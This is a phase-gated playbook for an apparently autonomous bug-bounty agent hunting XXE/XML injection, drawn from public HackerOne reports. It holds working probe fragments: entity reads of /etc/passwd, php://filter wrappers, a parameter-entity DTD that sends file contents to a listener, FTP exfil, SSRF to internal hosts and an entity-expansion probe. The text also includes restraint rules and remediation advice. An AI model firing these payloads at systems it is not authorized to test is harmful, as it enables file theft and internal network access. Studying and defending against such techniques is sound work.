---
title: "XXE/XML Injection — Testing Agent Playbook (phase-gated protocol)"
type: playbook
category: master-protocol
version: "1.0 (built 2026-10-27)"
cwe: "CWE-611"
evidence_base: "35 retrievable H1 reports (27 bodies read) + zseano XXE guide + hunt-xxe skill; see references/"
rule_zero: "Bodies win. Every claim below traces to a read body or is labeled as bibliographic/skill knowledge."
---

# XXE/XML Testing Agent Playbook

The executable protocol for an agent hunting XXE/XML injection. Phases are gated: do not advance
with an unmet gate. Built from the corpus in `references/case-register.md` (44 rows, 2013–2018
snapshot) plus the modern lane citations in `references/blogs-index.md`.

---

## P0 — Carrier inventory (no payloads fired)

**Goal: enumerate every surface that consumes XML — visible or hidden.**

1. **Declared XML endpoints**: WSDL (`?wsdl`, `/soapserver/`-style paths — the QIWI row's carrier),
   SOAP actions, SAML ACS (`/saml`, `SAMLResponse` POST params), XML-RPC (`xmlrpc.php`,
   `system.listMethods`), RSS/Atom feeds consumed *by* the app (Mail.ru Pulse lane).
2. **Import features that parse files**: translation import (XLF/XLIFF), spreadsheet import
   (XLSX — unzip → `xl/worksheets/sheet1.xml`), patient/record import (C-CDA), report import,
   office-document processors, metadata editors.
3. **Upload surfaces that can carry XML**: SVG (avatars, logos, emblems — rename-bypass lane),
   DOCX/XLSX/PPTX (OOXML = ZIP of XML), XLF, XMP metadata in images.
4. **Hidden parsers behind JSON APIs**: zseano's match-replace — set Burp match-replace
   `Content-Type: application/json → application/xml`, browse normally, watch for XML parser
   errors (the Informatica marketplace carrier was found exactly this way).
5. **GET→POST conversions**: an XML-only backend may hide behind a GET form endpoint (the Uber
   Movement anchor did exactly this: change to POST, add `Content-type: application/xml`).
6. **Config/policy XML served by the host**: `crossdomain.xml` at every subdomain root, `web.xml`
   exposure (adjacent classes — record, don't fire entities).

**Gate P0**: a written carrier list with one line each: URL, method, content-type, XML dialect,
source of the XML (request body / uploaded file / decoded field). Zero carriers = no XXE attack
surface; move to the next category playbook.

## P1 — Cheapest-first detection (prove parsing, before severity)

**Goal: find out whether an entity is resolved at all. Kill fast, spend nothing.**

1. **Inline general entity probe** (works on rendered and error channels alike):
   ```xml
   <!DOCTYPE foo [ <!ENTITY example "Doe"> ]>
   … <node>&example;</node>
   ```
   Reflected "Doe" = entity resolution + reflection → In-Band lane (P2-A). No reflection ≠ dead —
   it may be blind → continue to P2-B. Error/5xx = parsing happens, reflection may exist on other
   channels.
2. **Content-Type swap error oracle** (§P0.4): a JSON endpoint answering a malformed-XML body with
   `JAXBException`/`SAXParseException`/libxml2 text is a confirmed hidden parser.
3. **Path-existence oracle**: same shape, entity on a nonexistent path
   (`file:///etc/passwd1` → "(No such file or directory)" reflected = resolution + error-reflection
   channel confirmed, parser named).
4. **OOB ping probe** (requires listener up FIRST — self-hosted preferred,
   `*.burpcollaborator.net` is usually blocked per zseano): general entity → `http://<oast>/<unique-path>`.
   A callback with a **server-runtime User-Agent** (`Java/1.8.0_60` in the corpus anchor) = blind
   lane confirmed (P2-B). A callback with a **browser UA** = your client rendered it — kill (SVG
   client-side trap).

**Gate P1**: exactly one of {in-band reflection, blind callback, no resolution} determined, with
the raw request/response (or listener log) archived. "No resolution" after §2+§3 probes on a
confirmed parser = parser hardened → record, move on.

## P2 — Decision tree: lane assignment

**A. In-band lane** (reflection confirmed):
- Place the entity where the app **expects a different type** — the Twitter anchor's
  `operatorId` integer-cast echo (`Unable to convert [root:x:0:0:...] to an integer for
  [operatorId]`); JAXB cast errors; numeric sort/filter params; filename echo paths.
- Read safe files: `/etc/passwd`, `C:\Windows\win.ini`. PHP backends: prefer
  `php://filter/convert.base64-encode/resource=` wrappers.
- Escalate reflection content only as far as the report's evidence needs (no secrets).

**B. Blind/OOB lane** (callback confirmed, no reflection):
- Ladder, each rung = fresh unique path in the callback:
  1. Ping (proven in P1).
  2. Parameter-entity two-stage exfil DTD (Uber anchor's stage-2 shape; `%file;` loaded locally,
     `<!ENTITY % all "<!ENTITY send SYSTEM 'http://oast/content?%file;'>">%all;` hosted).
  3. On Java: **FTP transport** variant (`ftp://host/%b;`) — Informatica ondemand got /etc/passwd
     through it; use `&#37;` (percent-entity) to nest `%` in hosted DTDs.
  4. On full egress firewalls: **local-DTD error-based oracle** (mohemiv lane; honoki's
     blind→root read) — spawn a DTD already on disk, collide parameter entities, read the error.
- **Price honestly**: ping-only OOB paid $500 (Uber) — a callback without content is a callback,
  not a file read. Write the impact paragraph accordingly.

**C. Container lane** (file-upload carriers):
- Round-trip: download a legitimate file from the feature, mutate minimally (two DOCTYPE lines +
  one `&xxe;` in a text node — the Weblate XLF diff), upload, observe as rendered data or callback.
- XLSX/DOCX/PPTX: unzip, edit the inner XML part, rezip.
- SVG: rename `.svg→.jpg`; judge by **who parses** (target-server callback = bug; your-browser
  callback = nothing).

**Gate P2**: lane assigned with its own evidence archived; no cross-lane payload contamination.

## P3 — Carrier-specific escalation (only where the lane warrants)

1. **SAML carrier** (Blind §5): payload rides the **decoded** `SAMLResponse` prologue; test both
   orderings (decode-then-parse is the required one). If the SP verifies signatures before parsing,
   the entity lane dies — record and leave the signature-wrapping lane to `hunt-saml`.
2. **XML-RPC doors** (XML-RPC module): if an SSO/provisioning plugin creates users, test the API
   door with credential-orphan patterns (`@@@nopass@@@`); enumerate methods; ONE relay callback
   for pingback proofs.
3. **XXE→SSRF**: same parser, entity → `http://internal/` — internal reach = impact statement
   (the Twitter anchor's forward-looking SSRF sentence; Mail.ru's coupled title). Cloud metadata
   (169.254.169.254) only through the SSRF playbook's discipline — cross-ref `../SSRF/`.
4. **Entity-expansion (billion laughs)**: Trello's dark row shape — one expansion probe only,
   smallest amplification that proves the limit is missing; never sustained loops.

**Gate P3**: escalation adds *impact*, not payload variety. Each escalation has its own
one-variable probe pair.

## P4 — Gated escalation discipline (what you must NOT do)

- No destructive entity expansion loops, no sustained pingback floods, no third-party relay
  targets (DDoS lanes are one-callback proofs — §XML-RPC.7).
- No reads of secrets-bearing files beyond the minimum needed to prove the primitive
  (`/etc/passwd` truncated, keys masked).
- No claims above the demonstrated layer: file-read ≠ "any command" (the drchrono discipline);
  ping ≠ exfil (the Uber anchor's 404-in-log honesty).
- Listener on owned infrastructure only; report the raw log line (source IP, UA, path, timestamp).

## P5 — Report assembly

1. **Title formula**: `[Carrier] XXE at <host> — <lane>` (mirror corpus style:
   `"Blind OOB XXE At http://ubermovement.com/"`, `"[rev-app.informatica.com] — XXE via SAML"`).
2. **Impact first, quantified**: file read (files named), SSRF (internal reach), chain (auth
   bypass / RCE only when proven — the $7,000 XML-RPC row priced the *confirmed* bypass).
3. **Steps**: numbered, replayable, one-variable probes; full request + response blocks verbatim
   (the anchor bodies' discipline — that's why they became anchors).
4. **Attribution evidence**: callback log line with server-runtime UA (Blind §2) or reflected
   content block (In-Band §2).
5. **Severity honesty**: state the era-corrections — Informatica cluster labeled `Command
   Injection`/`Uncontrolled Resource Consumption` in archive while bodies show file read; DoD row
   `critical` metadata-only; Twitter `medium` at $10,080. Claim the demonstrated layer; note the
   label delta.
6. **Remediation paragraph** (tied to named parser): disable DTDs entirely where possible;
   `LIBXML_NOENT` off / `libxml_disable_entity_loader` semantics; JAXP
   `FEATURE_SECURE_PROCESSING` + external-entity disallowance; translate-toolkit/Excel-parsers
   pinned post-fix; SVG: server-side rasterization only, DTD-off.

---

## Kill-gates (any one = abandon or downgrade)

1. Parser confirmed but inline entity + path-oracle + OOB ping all silent → hardened parser
   (record fingerprint, next category).
2. SVG pingback arrives from your own IP → client-side render, not a bug.
3. Callback arrives with browser UA → same trap, different lane.
4. Exfil DTD yields callbacks but no content → report as ping-priced blind OOB, not file read.
5. Carrier is policy/config XML (crossdomain/web.xml) → adjacent class, report under its owner
   (`Crossdomain-and-Parser-Adjacents.md`), never as XXE.

## Corpus anchors (quick jump table)

| Lane | Anchor | Module |
|---|---|---|
| In-band error reflection | XXE-248668 (Twitter, $10,080 list) | In-Band-File-Read.md |
| Blind OOB ping + honest pricing | XXE-154096 (Uber, $500 JSON) | Blind-OOB-and-Parameter-Entities.md |
| OOB exfil via FTP | XXE-105753 (Informatica) | Blind-OOB-and-Parameter-Entities.md §3 |
| Container upload | XXE-232614 (Weblate XLF) / XXE-105434 (XLSX) | File-Upload-and-Format-Vectors.md |
| XML-RPC auth chain | XXE-138869 (Uber OneLogin, $7,000 JSON) | XML-RPC-Chains.md |
| Policy-file doctrine | XXE-43070 (Vimeo) / XXE-96662 (Badoo, $310 list) | Crossdomain-and-Parser-Adjacents.md |
